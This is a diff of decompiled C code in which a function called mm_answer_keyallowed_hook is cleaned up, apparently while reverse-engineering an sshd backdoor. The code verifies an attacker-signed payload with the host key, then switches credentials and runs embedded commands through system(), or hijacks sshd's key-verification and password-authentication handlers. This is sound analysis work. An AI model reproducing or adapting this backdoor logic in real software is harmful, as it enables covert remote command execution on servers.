@@ -20,8 +20,7 @@
 int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
 
 {
-  u8 *writebuf_len_bytes;
-  char payload_type;
+  u8 payload_type;
   u32 payload_state;
   libc_imports_t *libc_imports_ref;
   sshd_ctx_t *sshd_ctx;
@@ -36,16 +35,15 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   gid_t rgid;
   int orig_call_result;
   size_t header_copy_idx;
-  size_t copy_idx;
+  size_t sock_copy_idx;
   size_t payload_len;
   ssize_t write_result;
-  size_t payload_copy_idx;
+  size_t copy_idx;
   size_t payload_data_offset;
   sshd_payload_ctx_t **clear_cursor;
   u8 *payload_header_cursor;
-  u8 *payload_data_cursor;
   uid_t ruid;
-  ushort *payload_words;
+  sshd_payload_ctx_t *payload_record;
   u8 zero_seed;
   sshbuf payload_buf;
   global_context_t *global_ctx;
@@ -78,7 +76,7 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   if (((state_ok == FALSE) || (ctx->payload_state == 4)) || (ctx->payload_state == 0xffffffff))
   goto LAB_00109429;
   clear_cursor = &payload_ctx;
-  for (payload_copy_idx = 0x12; payload_copy_idx != 0; payload_copy_idx = payload_copy_idx + -1) {
+  for (copy_idx = 0x12; copy_idx != 0; copy_idx = copy_idx + -1) {
     *(undefined4 *)clear_cursor = 0;
     clear_cursor = (sshd_payload_ctx_t **)((long)clear_cursor + (ulong)zero_seed * -8 + 4);
   }
@@ -92,29 +90,28 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   payload_state = ctx->payload_state;
   if (payload_state == 3) {
 LAB_00109216:
-    payload_words = (ushort *)ctx->sshd_payload_ctx;
-    if (payload_words != (ushort *)0x0) {
-      payload_len = (ulong)*payload_words;
-      payload_type = *(char *)((long)payload_words + 0x3b);
+    payload_record = ctx->sshd_payload_ctx;
+    if (payload_record != (sshd_payload_ctx_t *)0x0) {
+      payload_len = (ulong)payload_record->payload_size;
+      payload_type = payload_record->payload_type;
       payload_data_offset = payload_len - 0x120;
       if (payload_type == '\x02') {
         if ((((ctx->sshd_ctx->mm_answer_keyverify_ptr != (void *)0x0) && (4 < payload_data_offset)) &&
-            (payload_data_offset = (ulong)payload_words[0x57], payload_words[0x57] != 0)) &&
+            (payload_data_offset = (ulong)payload_record->payload_data_offset, payload_record->payload_data_offset != 0)) &&
            ((payload_data_offset < payload_len - 0x122 && (payload_len = (payload_len - 0x122) - payload_data_offset, 2 < payload_len)))) {
-          writebuf_len_bytes = (undefined1 *)((long)payload_words + payload_data_offset + 0xb0);
-          *(undefined1 *)&sshd_ctx->writebuf_size = *writebuf_len_bytes;
-          *(undefined1 *)((long)&sshd_ctx->writebuf_size + 1) = writebuf_len_bytes[1];
+          *(u8 *)&sshd_ctx->writebuf_size = payload_record[1].signed_header[payload_data_offset - 2];
+          *(u8 *)((long)&sshd_ctx->writebuf_size + 1) = (payload_record[1].signed_header + (payload_data_offset - 2))[1];
           if ((sshd_ctx->writebuf_size == 0) || (payload_len - 2 < (ulong)sshd_ctx->writebuf_size)) {
             sshd_ctx->writebuf_size = 0;
           }
           else {
             sshd_ctx_cursor = ctx->sshd_ctx;
             libc_imports_ref = ctx->libc_imports;
-            sshd_ctx->writebuf = (u8 *)((long)payload_words + payload_data_offset + 0xb2);
+            sshd_ctx->writebuf = payload_record[1].signed_header + payload_data_offset;
             keyverify_handler = sshd_ctx_cursor->mm_answer_keyverify;
             if (keyverify_handler != (void *)0x0) {
               *(void **)sshd_ctx_cursor->mm_answer_keyverify_ptr = keyverify_handler;
-              write_result = fd_write(sock,payload_words + 0x58,payload_data_offset,libc_imports_ref);
+              write_result = fd_write(sock,payload_record + 1,payload_data_offset,libc_imports_ref);
               if (-1 < write_result) {
                 return 0;
               }
@@ -125,13 +122,13 @@ LAB_00109216:
       }
       else if (payload_type == '\x03') {
         if (((libc_imports_ref->system != (pfn_system_t)0x0) && (8 < payload_data_offset)) &&
-           (*(char *)((long)payload_words + (payload_len - 0x73)) == '\0')) {
-          uid_gid_pair = *(undefined8 *)(payload_words + 0x57);
+           (payload_record->signed_header[payload_len - 0x75] == '\0')) {
+          uid_gid_pair = *(undefined8 *)&payload_record->payload_data_offset;
           rgid = (gid_t)((ulong)uid_gid_pair >> 0x20);
           if (((rgid == 0) || (orig_call_result = (*libc_imports_ref->setresgid)(rgid,rgid,rgid), orig_call_result != -1)) &&
              ((ruid = (uid_t)uid_gid_pair, ruid == 0 ||
               (orig_call_result = (*libc_imports_ref->setresuid)(ruid,ruid,ruid), orig_call_result != -1)))) {
-            (*libc_imports_ref->system)((char *)(payload_words + 0x5b));
+            (*libc_imports_ref->system)((char *)(payload_record[1].signed_header + 4));
             ctx->payload_state = 4;
             goto LAB_0010944f;
           }
@@ -140,20 +137,20 @@ LAB_00109216:
       else if (((payload_type == '\x01') &&
                (ctx->sshd_ctx->mm_answer_authpassword_ptr != (sshd_monitor_func_t *)0x0)) &&
               (1 < payload_data_offset)) {
-        sshd_ctx->authpayload_len_bytes[0] = (u8)payload_words[0x57];
-        sshd_ctx->authpayload_len_bytes[1] = *(u8 *)((long)payload_words + 0xaf);
+        sshd_ctx->authpayload_len_bytes[0] = (u8)payload_record->payload_data_offset;
+        sshd_ctx->authpayload_len_bytes[1] = *(u8 *)((long)&payload_record->payload_data_offset + 1);
         if (*(ushort *)sshd_ctx->authpayload_len_bytes == 0) {
-          payload_words = (ushort *)0x0;
+          payload_record = (sshd_payload_ctx_t *)0x0;
         }
         else {
-          payload_words = payload_words + 0x58;
+          payload_record = payload_record + 1;
           if (payload_len - 0x122 < (ulong)*(ushort *)sshd_ctx->authpayload_len_bytes) {
             sshd_ctx->authpayload_len_bytes[0] = '\0';
             sshd_ctx->authpayload_len_bytes[1] = '\0';
             goto LAB_00109429;
           }
         }
-        sshd_ctx->pending_authpayload = (sshd_payload_ctx_t *)payload_words;
+        sshd_ctx->pending_authpayload = payload_record;
         ctx->payload_state = 4;
         state_ok = sshd_patch_variables(TRUE,FALSE,FALSE,0,ctx);
 LAB_001092e5:
@@ -164,12 +161,12 @@ LAB_001092e5:
   else if ((int)payload_state < 4) {
     if (payload_state == 0) {
       if (ctx->current_data_size < 0xae) goto LAB_0010944f;
-      payload_data_cursor = payload_seed_buf + 0x10;
-      for (payload_copy_idx = 0x29; payload_copy_idx != 0; payload_copy_idx = payload_copy_idx + -1) {
-        *payload_data_cursor = '\0';
-        payload_data_cursor = payload_data_cursor + (ulong)zero_seed * -2 + 1;
+      payload_header_cursor = payload_seed_buf + 0x10;
+      for (copy_idx = 0x29; copy_idx != 0; copy_idx = copy_idx + -1) {
+        *payload_header_cursor = '\0';
+        payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
       }
-      payload_data_cursor = ctx->payload_data;
+      payload_record = (sshd_payload_ctx_t *)ctx->payload_data;
       payload_seed_buf[0] = '\0';
       payload_seed_buf[1] = '\0';
       payload_seed_buf[2] = '\0';
@@ -186,10 +183,11 @@ LAB_001092e5:
       payload_seed_buf[0xd] = '\0';
       payload_seed_buf[0xe] = '\0';
       payload_seed_buf[0xf] = '\0';
-      if (((payload_data_cursor != (u8 *)0x0) && (ctx->sshd_sensitive_data != (sensitive_data *)0x0)) &&
+      if (((payload_record != (sshd_payload_ctx_t *)0x0) &&
+          (ctx->sshd_sensitive_data != (sensitive_data *)0x0)) &&
          ((ctx->sshd_sensitive_data->host_pubkeys != (sshkey **)0x0 &&
           (ctx->sshd_payload_ctx == (sshd_payload_ctx_t *)0x0)))) {
-        ctx->sshd_payload_ctx = payload_data_cursor;
+        ctx->sshd_payload_ctx = payload_record;
         payload_header_buf[0] = '\0';
         payload_header_buf[1] = '\0';
         payload_header_buf[2] = '\0';
@@ -207,26 +205,26 @@ LAB_001092e5:
         payload_header_buf[0xe] = '\0';
         payload_header_buf[0xf] = '\0';
         payload_header_cursor = payload_header_buf + 0x10;
-        for (payload_copy_idx = 0x4a; payload_copy_idx != 0; payload_copy_idx = payload_copy_idx + -1) {
+        for (copy_idx = 0x4a; copy_idx != 0; copy_idx = copy_idx + -1) {
           *payload_header_cursor = '\0';
           payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
         }
-        payload_copy_idx = 0;
+        copy_idx = 0;
         do {
-          payload_header_buf[payload_copy_idx] = payload_data_cursor[payload_copy_idx + 2];
-          payload_copy_idx = payload_copy_idx + 1;
-        } while (payload_copy_idx != 0x3a);
+          payload_header_buf[copy_idx] = payload_record->signed_header[copy_idx];
+          copy_idx = copy_idx + 1;
+        } while (copy_idx != 0x3a);
         state_ok = secret_data_get_decrypted(payload_seed_buf,ctx);
         if ((state_ok != FALSE) &&
            (state_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys
                                       [ctx->sshd_host_pubkey_idx],payload_header_buf,0x3a,0x5a,
-                                      ctx->sshd_payload_ctx + 0x3c,payload_seed_buf,ctx), state_ok != FALSE))
-        {
+                                      ctx->sshd_payload_ctx->signature,payload_seed_buf,ctx),
+           state_ok != FALSE)) {
           ctx->payload_state = 1;
-          payload_data_cursor = payload_seed_buf;
-          for (payload_copy_idx = 0x39; payload_copy_idx != 0; payload_copy_idx = payload_copy_idx + -1) {
-            *payload_data_cursor = '\0';
-            payload_data_cursor = payload_data_cursor + (ulong)zero_seed * -2 + 1;
+          payload_header_cursor = payload_seed_buf;
+          for (copy_idx = 0x39; copy_idx != 0; copy_idx = copy_idx + -1) {
+            *payload_header_cursor = '\0';
+            payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
           }
           state_ok = check_backdoor_state(ctx);
           goto LAB_001092e5;
@@ -235,8 +233,8 @@ LAB_001092e5:
       ctx->payload_state = 0xffffffff;
       ctx->sshd_payload_ctx = (sshd_payload_ctx_t *)0x0;
     }
-    else if ((payload_state == 1) && ((ushort *)ctx->sshd_payload_ctx != (ushort *)0x0)) {
-      payload_len = (ulong)*(ushort *)ctx->sshd_payload_ctx;
+    else if ((payload_state == 1) && (ctx->sshd_payload_ctx != (sshd_payload_ctx_t *)0x0)) {
+      payload_len = (ulong)ctx->sshd_payload_ctx->payload_size;
       payload_data_offset = ctx->current_data_size;
       if (payload_data_offset <= payload_len) {
         if (payload_data_offset != payload_len) goto LAB_0010944f;
@@ -265,25 +263,26 @@ LAB_00109471:
         payload_header_buf[0xd] = '\0';
         payload_header_buf[0xe] = '\0';
         payload_header_buf[0xf] = '\0';
-        payload_data_cursor = payload_header_buf + 0x10;
-        for (payload_copy_idx = 0x62; payload_copy_idx != 0; payload_copy_idx = payload_copy_idx + -1) {
-          *payload_data_cursor = '\0';
-          payload_data_cursor = payload_data_cursor + (ulong)zero_seed * -2 + 1;
+        payload_header_cursor = payload_header_buf + 0x10;
+        for (copy_idx = 0x62; copy_idx != 0; copy_idx = copy_idx + -1) {
+          *payload_header_cursor = '\0';
+          payload_header_cursor = payload_header_cursor + (ulong)zero_seed * -2 + 1;
         }
-        payload_data_cursor = ctx->payload_data;
-        payload_copy_idx = 0;
+        payload_header_cursor = ctx->payload_data;
+        copy_idx = 0;
         do {
-          header_copy_idx = payload_copy_idx + 1;
-          payload_header_buf[payload_copy_idx] = payload_data_cursor[payload_copy_idx + payload_data_offset];
-          payload_copy_idx = header_copy_idx;
+          header_copy_idx = copy_idx + 1;
+          payload_header_buf[copy_idx] = payload_header_cursor[copy_idx + payload_data_offset];
+          copy_idx = header_copy_idx;
         } while (header_copy_idx != 0x72);
-        if ((payload_len < payload_data_offset) || (copy_idx = 0, payload_len - payload_data_offset < sock_read_buf_len)) goto LAB_00109471;
-        for (; sock_read_buf_len != copy_idx; copy_idx = copy_idx + 1) {
-          payload_data_cursor[copy_idx + payload_data_offset] = ctx->sock_read_buf[copy_idx];
+        if ((payload_len < payload_data_offset) || (sock_copy_idx = 0, payload_len - payload_data_offset < sock_read_buf_len)) goto LAB_00109471;
+        for (; sock_read_buf_len != sock_copy_idx; sock_copy_idx = sock_copy_idx + 1) {
+          payload_header_cursor[sock_copy_idx + payload_data_offset] = ctx->sock_read_buf[sock_copy_idx];
         }
         state_ok = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
                                   ctx->payload_data,payload_data_offset + ctx->sock_read_buf_size,
-                                  ctx->payload_data_size,payload_header_buf,ctx->sshd_payload_ctx + 2,ctx);
+                                  ctx->payload_data_size,payload_header_buf,
+                                  ctx->sshd_payload_ctx->signed_header,ctx);
         if (state_ok == FALSE) {
           ctx->payload_state = 0xffffffff;
           goto LAB_00109471;
